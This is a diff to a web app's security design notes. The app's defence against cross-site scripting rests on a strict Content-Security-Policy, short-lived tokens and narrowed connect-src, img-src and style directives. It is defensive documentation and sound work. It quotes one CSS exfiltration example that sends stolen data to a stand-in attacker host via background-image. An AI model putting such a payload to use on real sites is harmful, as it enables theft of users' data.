@@ -154,7 +154,7 @@ So the defence is layered on stopping script from running at all:
 | No injection sinks | No `dangerouslySetInnerHTML`, `innerHTML`, `eval`, `new Function` or `document.write` anywhere in `src/`. React escapes by default; the only `src={}` bindings are `<img>` tags, which cannot execute. |
 | Content-Security-Policy | `script-src 'self'` with **no** `'unsafe-inline'` — injected script cannot execute even if a sink appeared. See below. |
 | Short-lived credentials | Bearer tokens last 10 minutes; refresh tokens rotate on every use, and replaying a rotated one revokes the whole family. A stolen token is worth minutes and trips the alarm on reuse. |
-| Transport | `connect-src` names exactly one API origin, so script cannot post data to an attacker's host. |
+| Transport | `connect-src` names exactly one API origin and `img-src` no remote host at all, so neither script nor injected CSS can send data anywhere. |
 
 Moving to httpOnly cookies is still a reasonable further step, but it is a
 smaller improvement than the policy above and is not a substitute for it.
@@ -169,22 +169,55 @@ its own API with nothing in the UI to explain why. Deriving both from one value
 makes that impossible.
 
 ```
-default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
-img-src 'self' data: https:; font-src 'self' data:;
+default-src 'self'; script-src 'self';
+style-src 'self' 'unsafe-inline'; style-src-elem 'self'; style-src-attr 'unsafe-inline';
+img-src 'self' data:; font-src 'self' data:;
 connect-src 'self' <VITE_API_URL origin>;
 base-uri 'self'; form-action 'self'; object-src 'none'
 ```
 
 - `script-src` needs no `'unsafe-inline'` because Vite emits a single external
   module script and no inline ones. That is the whole value of the policy.
-- `style-src` does allow inline styles: React `style={{…}}` and ag-grid both set
-  style attributes. Inline *styles* can restyle a page, not execute code.
 - `base-uri 'self'` matters more than it looks — without it an injected `<base>`
   tag can repoint every relative script URL at another host, walking around
   `script-src 'self'`.
 - `frame-ancestors` is set as a real header in `vercel.json`, not here, because
   browsers ignore it in a `<meta>` tag. `vercel.json` also sets `X-Frame-Options`,
   `X-Content-Type-Options`, `Referrer-Policy` and `Permissions-Policy`.
+
+##### Why inline styles are still allowed
+
+They cannot be removed, and it matters less than it looks.
+
+**Cannot:** a nonce or a hash only ever covers a `<style>` *element*. React
+`style={{…}}` and ag-grid emit style *attributes*, which no nonce can cover —
+`'unsafe-inline'` is the only thing that permits them. Hashes are no help
+either, since several of the values are computed (`width: ${percent}%`, the
+grid's pixel height), so the set of distinct values is unbounded. And this is a
+static site, so there is no per-request server to mint a fresh nonce anyway.
+
+**Matters less:** CSS cannot execute JavaScript. Its one real attack is
+exfiltration through a network sink — `background-image:
+url(https://attacker/?stolen)` — and that is governed by `img-src`, not
+`style-src`. Every film ships `poster: null` and the client draws a CSS
+gradient, so `img-src` is `'self' data:` with **no remote host to reach**.
+Closing that sink is the fix; removing the inline styles would not have been.
+
+What is still worth doing is narrowing what inline means:
+
+| Directive | Effect |
+|---|---|
+| `style-src-elem 'self'` | Stylesheet *elements* must be same-origin, so an injected `<style>` block is refused. Verified safe: the app adds zero `<style>` elements at runtime and links 3 same-origin stylesheets. |
+| `style-src-attr 'unsafe-inline'` | Style attributes keep working, which is what React and ag-grid actually need. |
+| `style-src 'self' 'unsafe-inline'` | Fallback for browsers that predate the two above (roughly pre-2022 Safari). They behave exactly as before rather than dropping every style attribute and collapsing the layout. |
+
+Rewriting the eight `style={{…}}` usages as classes was considered and rejected:
+four are computed values that would need CSSOM or a class per possible value,
+and with `img-src` closed the gain is close to zero against a real regression
+risk.
+
+Verified in Chromium: an injected `<style>` element is refused, while the grid
+still mounts with its computed inline height applied and the chart renders.
 
 The plugin is build-only. Vite's dev server injects an inline script for hot
 module replacement, so enforcing `script-src 'self'` in dev would break
